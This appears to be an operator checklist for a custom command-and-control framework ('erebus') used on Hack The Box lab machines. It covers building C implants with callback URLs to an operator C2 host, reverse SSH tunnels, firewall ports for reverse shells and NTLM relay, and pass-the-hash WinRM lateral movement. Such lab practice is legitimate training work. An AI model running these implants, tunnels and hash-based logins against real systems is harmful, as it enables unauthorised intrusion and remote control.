# Operator inbound checklist (lab / HTB)

**Audience:** before dropping any implant or starting a listener that faces `tun0`.  
**Related:** `docs/OPERATOR_PRE_IMPLANT.md`, `docs/C_IMPLANT_LAB_CHECKLIST.md`, `scripts/htb_reverse_tunnel.sh`.

Wire protocol still returns **HTTP 404** on auth failure (anti-fingerprint). Teamserver logs must show the reason class.

## Auth drop reasons (server log)

| Reason | Meaning | Typical fix |
| --- | --- | --- |
| `unknown_implant` | Secret lookup failed / not registered | Rebuild implant with fleet secret; check `implant_secret` / ldflags |
| `hmac` | HMAC signature mismatch | Wrong secret, wrong implant ID, or corrupted payload |
| `skew` | Timestamp outside replay window | Host/DC clock skew; sync time or widen window (default 8h) |
| `replay` | Same (id, timestamp) already seen | Sleep too low with second-resolution timestamps (fixed: use ms); or dual teamservers sharing ID |
| `parse` | Protobuf unmarshal failed | Wrong path/body, non-implant client, truncated POST |
| `io` | Body read failed | Client disconnect mid-request |
| `internal` | Session key / DB / other server error | Check full log line |

Example lines:

```text
[register] unknown_implant id=abc: no secret
[beacon] skew reject implant=abc: timestamp outside replay window
[https] beacon drop reason=parse len=12: proto: …
[https] beacon drop implant=abc: beacon auth failed: hmac: …
```

## Pre-flight (every eng)

```text
[ ] HTB VPN up; note tun0 IP (ip -br a show tun0)
[ ] Target reachable (nmap or ping as appropriate)
[ ] Secrets only in files (mode 600) — never bash $$ in double quotes
[ ] Clock: compare operator UTC vs DC LDAP currentTime if Kerberos later
```

## Teamserver vs listener

| Command | What it starts |
| --- | --- |
| `erebus teamserver` | Daemon: HTTPS implant listener + gRPC. Survives stdin EOF. **Use this for HTB C2.** |
| `erebus serve` | Teamserver + operator REPL. REPL/stdin EOF does **not** stop C2 (SIGINT/SIGTERM does). |
| `erebus serve --teamserver` | Same as `erebus teamserver` |
| HTTPS listener port | Prefer **≥1024** (e.g. `:8443`) for rootless ops |

```bash
make erebus
./build/erebus teamserver          # keep C2 up (nohup / tmux / detached SSH)
# gRPC often 127.0.0.1:50051; HTTPS implant port from config / flags (lab: 8443)
./build/erebus certs seats         # operator + approver for dual-control oneshots
# other terminal:
./build/erebus operator            # REPL; closing it leaves teamserver running
```

## Firewall (operator host)

Inbound from the box to your `tun0` is often blocked by **firewalld** / ufw:

```bash
# Fedora firewalld — open C2 + common lab ports
sudo firewall-cmd --add-port=8443/tcp
sudo firewall-cmd --add-port=8888/tcp   # NTLM relay (pre-implant)
sudo firewall-cmd --add-port=4444/tcp   # reverse shells
# optional (broader):
# sudo firewall-cmd --zone=trusted --add-interface=tun0
```

**Sanity check from target** (after foothold): `curl -vk https://YOUR_TUN0:8443/` should get a TLS handshake (404 body is fine).

## One command

```bash
erebus inbound status                         # tun0, listeners, proxy env, firewalld
erebus inbound tunnel user@TARGET_IP          # same as scripts/htb_reverse_tunnel.sh
eval "$(erebus inbound env --port 1080)"      # after: erebus op socks start --port 1080
```

Host `ldap` / `smb` / `ad` / `kerberos` honor `EREBUS_PROXY` / `ALL_PROXY` (SOCKS5 only). Loopback is not proxied unless `EREBUS_PROXY_LOCAL=1`.

## When target cannot reach tun0

Many HTB boxes (FireFlow, DarkZeroReturns, etc.) **block outbound to VPN**. Reverse-tunnel C2 onto target localhost:

```bash
# Operator: teamserver already listening on 127.0.0.1:8443
erebus inbound tunnel user@TARGET_IP
# equivalent: ./scripts/htb_reverse_tunnel.sh user@TARGET_IP

# Build implant to loopback (tunnel carries traffic)
make implant-c-linux \
  CALLBACK_URL=https://127.0.0.1:8443 \
  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \
  SLEEP_MS=500
```

## When operator cannot reach the DC

Start C reverse SOCKS, then run host AD tools through it (this is the fill-skeleton path):

```bash
erebus op socks start --port 1080
eval "$(erebus inbound env --port 1080)"
erebus ldap enum --dc DC --domain DOM --user u --pass-file p --type interesting
erebus smb shares --host DC --anon
erebus kerberos skew --dc DC
```

## Implant build hygiene

```bash
# Windows primary (C)
make implant-c CALLBACK_URL=https://YOUR_C2:8443 \
  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10

# Linux primary (C) — default after foothold on Linux HTB
make implant-c-linux CALLBACK_URL=https://YOUR_C2:8443 \
  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10
# Firewalled box: CALLBACK_URL=https://127.0.0.1:8443 + erebus inbound tunnel user@TARGET

# Or generate (empty language → c for both windows and linux)
# generate --os windows --arch amd64 --callback https://… --language c
# generate --os linux  --arch amd64 --callback https://… --language c
```

- Empty implant ID/secret → **fail closed** at build/load  
- HTTPS without CA pin → fail closed for C implant  
- Lab sleep: **≥500 ms** (ms timestamps; sub-second OK)  
- Go Linux: **fallback only** (e.g. reverse SOCKS until C M4c lands) — see `docs/plans/SPRINT_L_C_LINUX.md`

## WinRM PTH (A.1 notes)

```text
lateral winrm <host> "whoami" --user U --domain DOM --hash <32-hex-NT>
# or: --pass / --pass-file
```

| Path | Message encryption | Notes |
| --- | --- | --- |
| Password | **Yes** (NTLM seal via masterzen Encryption) | Prefer when password is available |
| Hash (PTH) | **Yes** (NTLM Sign/Seal + SPNEGO multipart) | Domain-aware TYPE3; **one flow** — seal if negotiated, no seal→plain retry. Sequential commands reuse the same WinRM session. |

On failure, errors include `pth_layer=` (`transport` / `http_negotiate` / `ntlm_handshake` / `key_derivation` / `sign_seal` / `winrm_mime` / `session_lifecycle`). Day-3 gate: name the layer before more PTH feature work. Live GOAD/pypsrp parity remains eng-verify (`docs/C_IMPLANT_LAB_CHECKLIST.md` §5).

## Dual-seat oneshots

```bash
./build/erebus op sessions
./build/erebus op shell -- whoami
./build/erebus op lateral winrm <IP> "whoami" --user u --domain D --hash <NT>
./build/erebus op pending
./build/erebus op approve-all
```

## End of session

```text
[ ] Stop SOCKS / listeners not needed
[ ] Kill implants on target
[ ] Close reverse tunnel SSH
[ ] firewall-cmd --remove-port=… if temporary
[ ] No secrets left in git status
```
